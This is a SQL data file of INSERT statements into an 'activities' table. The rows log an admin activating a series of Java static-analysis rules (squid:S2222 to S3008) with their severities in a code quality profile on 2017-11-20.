INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (771, '2017-11-20 07:28:42.827', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2222;ruleKey=squid:S2222;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEdLbbGRdfPp-qpm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (772, '2017-11-20 07:28:42.871', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2225;ruleKey=squid:S2225;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEd3bbGRdfPp-qpn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (773, '2017-11-20 07:28:42.904', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2226;ruleKey=squid:S2226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEeYbbGRdfPp-qpo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (774, '2017-11-20 07:28:42.949', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2230;ruleKey=squid:S2230;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEfFbbGRdfPp-qpp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (775, '2017-11-20 07:28:42.99', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2232;ruleKey=squid:S2232;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEfubbGRdfPp-qpq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (776, '2017-11-20 07:28:43.032', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2235;ruleKey=squid:S2235;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEgYbbGRdfPp-qpr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (777, '2017-11-20 07:28:43.073', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2236;ruleKey=squid:S2236;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEhBbbGRdfPp-qps');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (778, '2017-11-20 07:28:43.139', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2251;ruleKey=squid:S2251;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEiDbbGRdfPp-qpt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (779, '2017-11-20 07:28:43.185', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2252;ruleKey=squid:S2252;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEixbbGRdfPp-qpu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (780, '2017-11-20 07:28:43.279', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2254;ruleKey=squid:S2254;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEkPbbGRdfPp-qpv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (781, '2017-11-20 07:28:43.309', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2259;ruleKey=squid:S2259;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEktbbGRdfPp-qpw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (782, '2017-11-20 07:28:43.339', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2272;ruleKey=squid:S2272;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVElLbbGRdfPp-qpx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (783, '2017-11-20 07:28:43.383', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2273;ruleKey=squid:S2273;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEl3bbGRdfPp-qpy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (784, '2017-11-20 07:28:43.43', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2274;ruleKey=squid:S2274;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEmmbbGRdfPp-qpz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (785, '2017-11-20 07:28:43.464', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2275;ruleKey=squid:S2275;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEnIbbGRdfPp-qp0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (786, '2017-11-20 07:28:43.509', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2276;ruleKey=squid:S2276;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEn1bbGRdfPp-qp1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (787, '2017-11-20 07:28:43.539', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2277;ruleKey=squid:S2277;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEoTbbGRdfPp-qp2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (788, '2017-11-20 07:28:43.579', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2278;ruleKey=squid:S2278;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEo7bbGRdfPp-qp3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (789, '2017-11-20 07:28:43.639', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2293;ruleKey=squid:S2293;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEp3bbGRdfPp-qp4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (790, '2017-11-20 07:28:43.669', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2326;ruleKey=squid:S2326;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEqVbbGRdfPp-qp5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (791, '2017-11-20 07:28:43.714', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2386;ruleKey=squid:S2386;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVErCbbGRdfPp-qp6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (792, '2017-11-20 07:28:43.756', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2387;ruleKey=squid:S2387;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVErsbbGRdfPp-qp7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (793, '2017-11-20 07:28:43.789', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2388;ruleKey=squid:S2388;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEsNbbGRdfPp-qp8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (794, '2017-11-20 07:28:43.841', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2390;ruleKey=squid:S2390;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEtBbbGRdfPp-qp9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (795, '2017-11-20 07:28:43.886', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2391;ruleKey=squid:S2391;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEtubbGRdfPp-qp-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (796, '2017-11-20 07:28:43.932', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2437;ruleKey=squid:S2437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEucbbGRdfPp-qp_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (797, '2017-11-20 07:28:43.96', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2438;ruleKey=squid:S2438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEu4bbGRdfPp-qqA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (798, '2017-11-20 07:28:43.998', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2440;ruleKey=squid:S2440;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEvebbGRdfPp-qqB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (799, '2017-11-20 07:28:44.035', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2441;ruleKey=squid:S2441;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEwDbbGRdfPp-qqC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (800, '2017-11-20 07:28:44.078', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2442;ruleKey=squid:S2442;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEwubbGRdfPp-qqD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (801, '2017-11-20 07:28:44.165', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2445;ruleKey=squid:S2445;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEyFbbGRdfPp-qqE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (802, '2017-11-20 07:28:44.243', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2446;ruleKey=squid:S2446;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEzTbbGRdfPp-qqF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (803, '2017-11-20 07:28:44.367', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2447;ruleKey=squid:S2447;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE1PbbGRdfPp-qqG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (804, '2017-11-20 07:28:44.408', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2583;ruleKey=squid:S2583;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE14bbGRdfPp-qqH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (805, '2017-11-20 07:28:44.452', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2589;ruleKey=squid:S2589;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE2kbbGRdfPp-qqI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (806, '2017-11-20 07:28:44.536', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2629;ruleKey=squid:S2629;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE34bbGRdfPp-qqJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (807, '2017-11-20 07:28:44.646', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2637;ruleKey=squid:S2637;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE5mbbGRdfPp-qqK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (808, '2017-11-20 07:28:44.69', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2638;ruleKey=squid:S2638;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE6SbbGRdfPp-qqL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (809, '2017-11-20 07:28:44.732', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2639;ruleKey=squid:S2639;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE68bbGRdfPp-qqM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (810, '2017-11-20 07:28:44.808', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2653;ruleKey=squid:S2653;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE8IbbGRdfPp-qqN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (811, '2017-11-20 07:28:44.848', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2674;ruleKey=squid:S2674;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE8wbbGRdfPp-qqO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (812, '2017-11-20 07:28:44.888', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2675;ruleKey=squid:S2675;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE9YbbGRdfPp-qqP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (813, '2017-11-20 07:28:44.93', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2676;ruleKey=squid:S2676;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE-CbbGRdfPp-qqQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (814, '2017-11-20 07:28:44.973', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2677;ruleKey=squid:S2677;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE-tbbGRdfPp-qqR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (815, '2017-11-20 07:28:45.027', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2681;ruleKey=squid:S2681;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVE_jbbGRdfPp-qqS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (816, '2017-11-20 07:28:45.094', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2692;ruleKey=squid:S2692;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFAmbbGRdfPp-qqT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (817, '2017-11-20 07:28:45.164', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2695;ruleKey=squid:S2695;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFBrbbGRdfPp-qqU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (818, '2017-11-20 07:28:45.209', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2696;ruleKey=squid:S2696;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFCZbbGRdfPp-qqV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (819, '2017-11-20 07:28:45.316', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2718;ruleKey=squid:S2718;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFEEbbGRdfPp-qqW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (820, '2017-11-20 07:28:45.36', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2737;ruleKey=squid:S2737;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFEwbbGRdfPp-qqX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (821, '2017-11-20 07:28:45.401', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2757;ruleKey=squid:S2757;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFFZbbGRdfPp-qqY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (822, '2017-11-20 07:28:45.467', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2786;ruleKey=squid:S2786;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFGabbGRdfPp-qqZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (823, '2017-11-20 07:28:45.512', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2789;ruleKey=squid:S2789;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFHIbbGRdfPp-qqa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (824, '2017-11-20 07:28:45.558', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2864;ruleKey=squid:S2864;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFH2bbGRdfPp-qqb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (825, '2017-11-20 07:28:45.604', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2885;ruleKey=squid:S2885;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFIkbbGRdfPp-qqc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (826, '2017-11-20 07:28:45.652', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2886;ruleKey=squid:S2886;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFJUbbGRdfPp-qqd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (827, '2017-11-20 07:28:45.685', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2912;ruleKey=squid:S2912;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFJ1bbGRdfPp-qqe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (828, '2017-11-20 07:28:45.715', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2924;ruleKey=squid:S2924;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFKTbbGRdfPp-qqf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (829, '2017-11-20 07:28:45.762', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2925;ruleKey=squid:S2925;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFLCbbGRdfPp-qqg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (830, '2017-11-20 07:28:45.81', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2970;ruleKey=squid:S2970;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFLybbGRdfPp-qqh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (831, '2017-11-20 07:28:45.849', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2975;ruleKey=squid:S2975;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFMZbbGRdfPp-qqi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (832, '2017-11-20 07:28:45.884', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2976;ruleKey=squid:S2976;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFM8bbGRdfPp-qqj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (833, '2017-11-20 07:28:45.911', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3008;ruleKey=squid:S3008;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFNXbbGRdfPp-qqk');
